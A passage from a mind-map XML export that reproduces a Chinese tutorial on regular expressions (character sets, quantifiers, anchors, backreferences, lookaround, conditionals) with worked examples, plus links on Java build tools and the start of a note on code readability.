    <span rel="nofollow">Java Build Tools Comparisons: Ant vs Maven vs Gradle</span>
  </body>
</html>
</richcontent>
</node>
<node ID="ID_274914125" CREATED="1754751792669" MODIFIED="1754751792671" LINK="http://sagioto.github.io/maven2gradle/"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <span rel="nofollow">maven 2 gradle</span>
  </body>
</html>
</richcontent>
</node>
<node ID="ID_1326514560" CREATED="1754751792672" MODIFIED="1754751792676" LINK="https://www.imooc.com/learn/833"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <span rel="nofollow">新一代构建工具 gradle</span>
  </body>
</html>
</richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_618367192" CREATED="1754749813740" MODIFIED="1754750707493" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      正则表达式
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_486646976" CREATED="1754750651284" MODIFIED="1754750651286"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、概述
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、概述" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#一概述">
</a>
    <p dir="auto">
      正则表达式用于文本内容的查找和替换。
    </p>
    <p dir="auto">
      正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。
    </p>
    <p dir="auto">
      <a href="https://regexr.com/" rel="nofollow">正则表达式在线工具</a>
    </p>
  </body>
</html></richcontent>
<node TEXT="正则表达式在线工具" ID="ID_950758665" CREATED="1754751798392" MODIFIED="1754751798393" LINK="https://regexr.com/"/>
</node>
<node ID="ID_1614496465" CREATED="1754750651286" MODIFIED="1754750651288"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、匹配单个字符
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、匹配单个字符" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#二匹配单个字符">
</a>
    <p dir="auto">
      <strong>.</strong>&#xa0;可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符；
    </p>
    <p dir="auto">
      <strong>.</strong>&#xa0;是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上 \ 。
    </p>
    <p dir="auto">
      正则表达式一般是区分大小写的，但也有些实现不区分。
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <pre class="notranslate">C.C2018</pre>
    <p dir="auto">
      <strong>匹配结果</strong>
    </p>
    <p dir="auto">
      My name is <strong>CyC2018</strong>&#xa0;.
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_205433498" CREATED="1754750651288" MODIFIED="1754750651290"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、匹配一组字符
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 三、匹配一组字符" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#三匹配一组字符">
</a>
    <p dir="auto">
      <strong>[ ]</strong>&#xa0;定义一个字符集合；
    </p>
    <p dir="auto">
      0-9、a-z 定义了一个字符区间，区间使用 ASCII 码来确定，字符区间在 [ ] 中使用。
    </p>
    <p dir="auto">
      <strong>-</strong>&#xa0;只有在 [ ] 之间才是元字符，在 [ ] 之外就是一个普通字符；
    </p>
    <p dir="auto">
      <strong>^</strong>&#xa0;在 [ ] 中是取非操作。
    </p>
    <p dir="auto">
      <strong>应用</strong>
    </p>
    <p dir="auto">
      匹配以 abc 为开头，并且最后一个字母不为数字的字符串：
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <pre class="notranslate">abc[^0-9]</pre>
    <p dir="auto">
      <strong>匹配结果</strong>
    </p>
    <ol dir="auto">
      <li>
        <strong>abcd</strong>
      </li>
      <li>
        abc1
      </li>
      <li>
        abc2
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_595140039" CREATED="1754750651290" MODIFIED="1754750651290"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、使用元字符
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_868859590" CREATED="1754750651291" MODIFIED="1754750651295"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      匹配空白字符
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 匹配空白字符" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#匹配空白字符">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          元字符
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          [\b]
        </td>
        <td>
          回退（删除）一个字符
        </td>
      </tr>
      <tr>
        <td>
          \f
        </td>
        <td>
          换页符
        </td>
      </tr>
      <tr>
        <td>
          \n
        </td>
        <td>
          换行符
        </td>
      </tr>
      <tr>
        <td>
          \r
        </td>
        <td>
          回车符
        </td>
      </tr>
      <tr>
        <td>
          \t
        </td>
        <td>
          制表符
        </td>
      </tr>
      <tr>
        <td>
          \v
        </td>
        <td>
          垂直制表符
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      \r\n 是 Windows 中的文本行结束标签，在 Unix/Linux 则是 \n。
    </p>
    <p dir="auto">
      \r\n\r\n 可以匹配 Windows 下的空白行，因为它匹配两个连续的行尾标签，而这正是两条记录之间的空白行；
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_701455542" CREATED="1754750651296" MODIFIED="1754750651296"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      匹配特定的字符
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_728038653" CREATED="1754750651297" MODIFIED="1754750651299"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 数字元字符
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 数字元字符" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#1-数字元字符">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          元字符
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          \d
        </td>
        <td>
          数字字符，等价于 [0-9]
        </td>
      </tr>
      <tr>
        <td>
          \D
        </td>
        <td>
          非数字字符，等价于 [^0-9]
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
<node ID="ID_404875754" CREATED="1754750651299" MODIFIED="1754750651301"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 字母数字元字符
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 字母数字元字符" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#2-字母数字元字符">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          元字符
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          \w
        </td>
        <td>
          大小写字母，下划线和数字，等价于 [a-zA-Z0-9_]
        </td>
      </tr>
      <tr>
        <td>
          \W
        </td>
        <td>
          对 \w 取非
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
<node ID="ID_822372793" CREATED="1754750651302" MODIFIED="1754750651303"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 空白字符元字符
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 空白字符元字符" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#3-空白字符元字符">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          元字符
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          \s
        </td>
        <td>
          任何一个空白字符，等价于 [\f\n\r\t\v]
        </td>
      </tr>
      <tr>
        <td>
          \S
        </td>
        <td>
          对 \s 取非
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      \x 匹配十六进制字符，\0 匹配八进制，例如 \xA 对应值为 10 的 ASCII 字符 ，即 \n。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node ID="ID_1063973272" CREATED="1754750651303" MODIFIED="1754750651305"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、重复匹配
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 五、重复匹配" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#五重复匹配">
</a>
    <ul dir="auto">
      <li>
        <strong>+</strong>&#xa0;匹配 1 个或者多个字符
      </li>
      <li>
        *<em>*</em>&#xa0;* 匹配 0 个或者多个字符
      </li>
      <li>
        <strong>?</strong>&#xa0;匹配 0 个或者 1 个字符
      </li>
    </ul>
    <p dir="auto">
      <strong>应用</strong>
    </p>
    <p dir="auto">
      匹配邮箱地址。
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <pre class="notranslate">[\w.]+@\w+\.\w+</pre>
    <p dir="auto">
      [\w.] 匹配的是字母数字或者 . ，在其后面加上 + ，表示匹配多次。在字符集合 [ ] 里，. 不是元字符；
    </p>
    <p dir="auto">
      <strong>匹配结果</strong>
    </p>
    <p dir="auto">
      <strong>abc.def&lt;span&gt;@&lt;/span&gt;qq.com</strong>
    </p>
    <ul dir="auto">
      <li>
        <strong>{n}</strong>&#xa0;匹配 n 个字符
      </li>
      <li>
        <strong>{m,n}</strong>&#xa0;匹配 m~n 个字符
      </li>
      <li>
        <strong>{m,}</strong>&#xa0;至少匹配 m 个字符
      </li>
    </ul>
    <p dir="auto">
      * 和 + 都是贪婪型元字符，会匹配尽可能多的内容。在后面加 ? 可以转换为懒惰型元字符，例如 *?、+? 和 {m,n}? 。
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <pre class="notranslate">a.+c</pre>
    <p dir="auto">
      <strong>匹配结果</strong>
    </p>
    <p dir="auto">
      <strong>abcabcabc</strong>
    </p>
    <p dir="auto">
      由于 + 是贪婪型的，因此 .+ 会匹配更可能多的内容，所以会把整个 abcabcabc 文本都匹配，而不是只匹配前面的 abc 文本。用懒惰型可以实现匹配前面的。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1238163579" CREATED="1754750651306" MODIFIED="1754750651306"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、位置匹配
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1778818090" CREATED="1754750651307" MODIFIED="1754750651309"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      单词边界
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 单词边界" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#单词边界">
</a>
    <p dir="auto">
      <strong>\b</strong>&#xa0;可以匹配一个单词的边界，边界是指位于 \w 和 \W 之间的位置；<strong>\B</strong>&#xa0;匹配一个不是单词边界的位置。
    </p>
    <p dir="auto">
      \b 只匹配位置，不匹配字符，因此 \babc\b 匹配出来的结果为 3 个字符。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1393121994" CREATED="1754750651309" MODIFIED="1754750651311"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      字符串边界
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 字符串边界" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#字符串边界">
</a>
    <p dir="auto">
      <strong>^</strong>&#xa0;匹配整个字符串的开头，<strong>$</strong>&#xa0;匹配结尾。
    </p>
    <p dir="auto">
      ^ 元字符在字符集合中用作求非，在字符集合外用作匹配字符串的开头。
    </p>
    <p dir="auto">
      分行匹配模式（multiline）下，换行被当做字符串的边界。
    </p>
    <p dir="auto">
      <strong>应用</strong>
    </p>
    <p dir="auto">
      匹配代码中以 // 开始的注释行
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <pre class="notranslate">^\s*\/\/.*$</pre>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6b0933cef90f96d46019f8885436e49cb838aa8bdaa6727702942e2b1d949c5b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36303065396337352d353033332d346461642d616532622d3933303935376462363338652e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/6b0933cef90f96d46019f8885436e49cb838aa8bdaa6727702942e2b1d949c5b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36303065396337352d353033332d346461642d616532622d3933303935376462363338652e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/600e9c75-5033-4dad-ae2b-930957db638e.png"/>
    </a><br/>
    

    <p dir="auto">
      <strong>匹配结果</strong>
    </p>
    <ol dir="auto">
      <li>
        public void fun() {
      </li>
      <li>
        &#xa0;&#xa0;&#xa0;&#xa0; <strong>// 注释 1</strong>
      </li>
      <li>
        &#xa0;&#xa0;&#xa0;&#xa0;&#xa0;int a = 1;
      </li>
      <li>
        &#xa0;&#xa0;&#xa0;&#xa0;&#xa0;int b = 2;
      </li>
      <li>
        &#xa0;&#xa0;&#xa0;&#xa0; <strong>// 注释 2</strong>
      </li>
      <li>
        &#xa0;&#xa0;&#xa0;&#xa0;&#xa0;int c = a + b;
      </li>
      <li>
        }
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_286276776" CREATED="1754750651312" MODIFIED="1754750651313"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      七、使用子表达式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 七、使用子表达式" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#七使用子表达式">
</a>
    <p dir="auto">
      使用 <strong>( )</strong>&#xa0;定义一个子表达式。子表达式的内容可以当成一个独立元素，即可以将它看成一个字符，并且使用 * 等元字符。
    </p>
    <p dir="auto">
      子表达式可以嵌套，但是嵌套层次过深会变得很难理解。
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <pre class="notranslate">(ab){2,}</pre>
    <p dir="auto">
      <strong>匹配结果</strong>
    </p>
    <p dir="auto">
      <strong>ababab</strong>
    </p>
    <p dir="auto">
      <strong>|</strong>&#xa0;是或元字符，它把左边和右边所有的部分都看成单独的两个部分，两个部分只要有一个匹配就行。
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <pre class="notranslate">(19|20)\d{2}</pre>
    <p dir="auto">
      <strong>匹配结果</strong>
    </p>
    <ol dir="auto">
      <li>
        <strong>1900</strong>
      </li>
      <li>
        <strong>2010</strong>
      </li>
      <li>
        1020
      </li>
    </ol>
    <p dir="auto">
      <strong>应用</strong>
    </p>
    <p dir="auto">
      匹配 IP 地址。
    </p>
    <p dir="auto">
      IP 地址中每部分都是 0-255 的数字，用正则表达式匹配时以下情况是合法的：
    </p>
    <ul dir="auto">
      <li>
        一位数字
      </li>
      <li>
        不以 0 开头的两位数字
      </li>
      <li>
        1 开头的三位数
      </li>
      <li>
        2 开头，第 2 位是 0-4 的三位数
      </li>
      <li>
        25 开头，第 3 位是 0-5 的三位数
      </li>
    </ul>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <pre class="notranslate">((25[0-5]|(2[0-4]\d)|(1\d{2})|([1-9]\d)|(\d))\.){3}(25[0-5]|(2[0-4]\d)|(1\d{2})|([1-9]\d)|(\d))</pre>
    <p dir="auto">
      <strong>匹配结果</strong>
    </p>
    <ol dir="auto">
      <li>
        <strong>192.168.0.1</strong>
      </li>
      <li>
        00.00.00.00
      </li>
      <li>
        555.555.555.555
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_894946365" CREATED="1754750651314" MODIFIED="1754750651316"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      八、回溯引用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 八、回溯引用" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#八回溯引用">
</a>
    <p dir="auto">
      回溯引用使用 <strong>\n</strong>&#xa0;来引用某个子表达式，其中 n 代表的是子表达式的序号，从 1 开始。它和子表达式匹配的内容一致，比如子表达式匹配到 abc，那么回溯引用部分也需要匹配 abc 。
    </p>
    <p dir="auto">
      <strong>应用</strong>
    </p>
    <p dir="auto">
      匹配 HTML 中合法的标题元素。
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <p dir="auto">
      \1 将回溯引用子表达式 (h[1-6]) 匹配的内容，也就是说必须和子表达式匹配的内容一致。
    </p>
    <pre class="notranslate">&lt;(h[1-6])&gt;\w*?&lt;\/\1&gt;</pre>
    <p dir="auto">
      <strong>匹配结果</strong>
    </p>
    <ol dir="auto">
      <li>
        <strong>&lt;h1&gt;x&lt;/h1&gt;</strong>
      </li>
      <li>
        <strong>&lt;h2&gt;x&lt;/h2&gt;</strong>
      </li>
      <li>
        &lt;h3&gt;x&lt;/h1&gt;
      </li>
    </ol>
  </body>
</html></richcontent>
<node ID="ID_142216331" CREATED="1754750651316" MODIFIED="1754750651318"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      替换
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 替换" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#替换">
</a>
    <p dir="auto">
      需要用到两个正则表达式。
    </p>
    <p dir="auto">
      <strong>应用</strong>
    </p>
    <p dir="auto">
      修改电话号码格式。
    </p>
    <p dir="auto">
      <strong>文本</strong>
    </p>
    <p dir="auto">
      313-555-1234
    </p>
    <p dir="auto">
      <strong>查找正则表达式</strong>
    </p>
    <pre class="notranslate">(\d{3})(-)(\d{3})(-)(\d{4})</pre>
    <p dir="auto">
      <strong>替换正则表达式</strong>
    </p>
    <p dir="auto">
      在第一个子表达式查找的结果加上 () ，然后加一个空格，在第三个和第五个字表达式查找的结果中间加上 - 进行分隔。
    </p>
    <pre class="notranslate">($1) $3-$5</pre>
    <p dir="auto">
      <strong>结果</strong>
    </p>
    <p dir="auto">
      (313) 555-1234
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_530629882" CREATED="1754750651318" MODIFIED="1754750651320"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      大小写转换
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 大小写转换" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#大小写转换">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          元字符
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          \l
        </td>
        <td>
          把下个字符转换为小写
        </td>
      </tr>
      <tr>
        <td>
          \u
        </td>
        <td>
          把下个字符转换为大写
        </td>
      </tr>
      <tr>
        <td>
          \L
        </td>
        <td>
          把\L 和\E 之间的字符全部转换为小写
        </td>
      </tr>
      <tr>
        <td>
          \U
        </td>
        <td>
          把\U 和\E 之间的字符全部转换为大写
        </td>
      </tr>
      <tr>
        <td>
          \E
        </td>
        <td>
          结束\L 或者\U
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      <strong>应用</strong>
    </p>
    <p dir="auto">
      把文本的第二个和第三个字符转换为大写。
    </p>
    <p dir="auto">
      <strong>文本</strong>
    </p>
    <p dir="auto">
      abcd
    </p>
    <p dir="auto">
      <strong>查找</strong>
    </p>
    <pre class="notranslate">(\w)(\w{2})(\w)</pre>
    <p dir="auto">
      <strong>替换</strong>
    </p>
    <pre class="notranslate">$1\U$2\E$3</pre>
    <p dir="auto">
      <strong>结果</strong>
    </p>
    <p dir="auto">
      aBCd
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_589317621" CREATED="1754750651320" MODIFIED="1754750651322"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      九、前后查找
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 九、前后查找" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#九前后查找">
</a>
    <p dir="auto">
      前后查找规定了匹配的内容首尾应该匹配的内容，但是又不包含首尾匹配的内容。
    </p>
    <p dir="auto">
      向前查找使用 <strong>?=</strong>&#xa0;定义，它规定了尾部匹配的内容，这个匹配的内容在 ?= 之后定义。所谓向前查找，就是规定了一个匹配的内容，然后以这个内容为尾部向前面查找需要匹配的内容。向后匹配用 ?&lt;= 定义（注: JavaScript 不支持向后匹配，Java 对其支持也不完善）。
    </p>
    <p dir="auto">
      <strong>应用</strong>
    </p>
    <p dir="auto">
      查找出邮件地址 @ 字符前面的部分。
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <pre class="notranslate">\w+(?=@)</pre>
    <p dir="auto">
      <strong>结果</strong>
    </p>
    <p dir="auto">
      <strong>abc</strong>&#xa0;@qq.com
    </p>
    <p dir="auto">
      对向前和向后查找取非，只要把 = 替换成 ! 即可，比如 (?=) 替换成 (?!) 。取非操作使得匹配那些首尾不符合要求的内容。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_840330752" CREATED="1754750651322" MODIFIED="1754750651322"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十、嵌入条件
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_440247432" CREATED="1754750651325" MODIFIED="1754750651327"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      回溯引用条件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 回溯引用条件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#回溯引用条件">
</a>
    <p dir="auto">
      条件为某个子表达式是否匹配，如果匹配则需要继续匹配条件表达式后面的内容。
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <p dir="auto">
      子表达式 (\() 匹配一个左括号，其后的 ? 表示匹配 0 个或者 1 个。 ?(1) 为条件，当子表达式 1 匹配时条件成立，需要执行 ) 匹配，也就是匹配右括号。
    </p>
    <pre class="notranslate">(\()?abc(?(1)\))</pre>
    <p dir="auto">
      <strong>结果</strong>
    </p>
    <ol dir="auto">
      <li>
        <strong>(abc)</strong>
      </li>
      <li>
        <strong>abc</strong>
      </li>
      <li>
        (abc
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
<node ID="ID_1694923205" CREATED="1754750651327" MODIFIED="1754750651329"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      前后查找条件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 前后查找条件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#前后查找条件">
</a>
    <p dir="auto">
      条件为定义的首尾是否匹配，如果匹配，则继续执行后面的匹配。注意，首尾不包含在匹配的内容中。
    </p>
    <p dir="auto">
      <strong>正则表达式</strong>
    </p>
    <p dir="auto">
      ?(?=-) 为前向查找条件，只有在以 - 为前向查找的结尾能匹配 \d{5} ，才继续匹配 -\d{4} 。
    </p>
    <pre class="notranslate">\d{5}(?(?=-)-\d{4})</pre>
    <p dir="auto">
      <strong>结果</strong>
    </p>
    <ol dir="auto">
      <li>
        <strong>11111</strong>
      </li>
      <li>
        22222-
      </li>
      <li>
        <strong>33333-4444</strong>
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_625300413" CREATED="1754750651329" MODIFIED="1754750651331"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        BenForta. 正则表达式必知必会 [M]. 人民邮电出版社, 2007.
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" POSITION="top_or_left" ID="ID_1349459189" CREATED="1754749744697" MODIFIED="1754749815229" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>编码实践</strong>
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1403649089" CREATED="1754749815221" MODIFIED="1754750690644" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      代码可读性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。
    </p>
    <p>
      可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。
    </p>
    <p>
      只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。
    </p>
    <p>
      一些比较有表达力的单词：
    </p>
    <div class="tableWrapper">
      <table>
        <colgroup>
        <col/>
        <col/>
        </colgroup>
        

        <tr>
          <th colspan="1" rowspan="1">
            <p>
              单词
            </p>
          </th>
          <th colspan="1" rowspan="1">
            <p>
              可替代单词
            </p>
          </th>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              send
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              deliver、dispatch、announce、distribute、route
            </p>
          </td>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              find
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              search、extract、locate、recover
            </p>
          </td>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              start
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              launch、create、begin、open
            </p>
          </td>
        </tr>
        <tr>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              make
            </p>
          </td>
          <td colspan="1" rowspan="1" draggable="true">
            <p>
              create、set up、build、generate、compose、add、new
            </p>
          </td>
        </tr>
      </table>
    </div>
    <p>
      使用 i、j、k 作为循环迭代器的名字过于简单，user_i、member_i 这种名字会更有表达力。因为循环层次越多，代码越难理解，有表达力的迭代器名字可读性会更高。
    </p>
    <p>
